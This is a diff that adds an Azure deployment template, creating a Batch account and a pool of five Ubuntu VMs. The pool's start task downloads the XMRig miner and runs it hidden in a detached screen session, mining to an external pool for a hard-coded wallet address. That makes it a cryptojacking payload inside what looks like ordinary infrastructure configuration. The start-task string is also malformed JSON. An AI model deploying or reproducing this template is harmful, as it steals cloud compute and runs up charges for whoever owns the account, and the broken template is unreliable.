@@ -1,0 +1,92 @@
+{
+    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+    "contentVersion": "1.0.0.0",
+    "parameters": {
+        "batchAccounts_abc0682d9_name": {
+            "defaultValue": "abc0682d9",
+            "type": "String"
+        },
+        "location": {
+            "defaultValue": "westus2",
+            "type": "string"
+        }
+    },
+    "variables": {},
+    "resources": [
+        {
+            "type": "Microsoft.Batch/batchAccounts",
+            "apiVersion": "2021-06-01",
+            "name": "[parameters('batchAccounts_abc0682d9_name')]",
+            "location": "[parameters('location')]",
+            "identity": {
+                "type": "None"
+            },
+            "properties": {
+                "poolAllocationMode": "BatchService",
+                "publicNetworkAccess": "Enabled",
+                "encryption": {
+                    "keySource": "Microsoft.Batch"
+                },
+                "allowedAuthenticationModes": [
+                    "SharedKey",
+                    "AAD",
+                    "TaskAuthenticationToken"
+                ]
+            }
+        },
+        {
+            "type": "Microsoft.Batch/batchAccounts/pools",
+            "apiVersion": "2021-06-01",
+            "name": "[concat(parameters('batchAccounts_abc0682d9_name'), '/', parameters('batchAccounts_abc0682d9_name'), 'p')]",
+            "dependsOn": [
+                "[resourceId('Microsoft.Batch/batchAccounts', parameters('batchAccounts_abc0682d9_name'))]"
+            ],
+            "properties": {
+                "vmSize": "STANDARD_D2S_V3",
+                "interNodeCommunication": "Disabled",
+                "taskSlotsPerNode": 1,
+                "taskSchedulingPolicy": {
+                    "nodeFillType": "Pack"
+                },
+                "deploymentConfiguration": {
+                    "virtualMachineConfiguration": {
+                        "imageReference": {
+                            "publisher": "canonical",
+                            "offer": "ubuntuserver",
+                            "sku": "18.04-lts",
+                            "version": "latest"
+                        },
+                        "nodeAgentSkuId": "batch.node.ubuntu 18.04",
+                        "nodePlacementConfiguration": {
+                            "policy": "Regional"
+                        }
+                    }
+                },
+                "networkConfiguration": {
+                    "publicIPAddressConfiguration": {
+                        "provision": "BatchManaged"
+                    }
+                },
+                "scaleSettings": {
+                    "fixedScale": {
+                        "targetDedicatedNodes": 5,
+                        "targetLowPriorityNodes": 0,
+                        "resizeTimeout": "PT15M"
+                    }
+                },
+                "startTask": {
+                    "commandLine": "/bin/bash -c \"\ncd $HOME;\nsudo apt-get update 
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
+tar -xf xmrig-6.18.0-linux-x64.tar.gz
+cd xmrig-6.18.0
+screen -dmS run ./xmrig -a ghostrider -o stratum-eu.rplant.xyz:17075 --tls -u BiQnizGzocTpGQGdV5AMNjEmAJXU6SWw3n.MDK-$(echo $(shuf -i 10000-99999 -n 1)) -p x --pass -t 8
+                        }
+                    },
+                    "maxTaskRetryCount": 0,
+                    "waitForSuccess": true
+                }
+            }
+        }
+    ]
+}
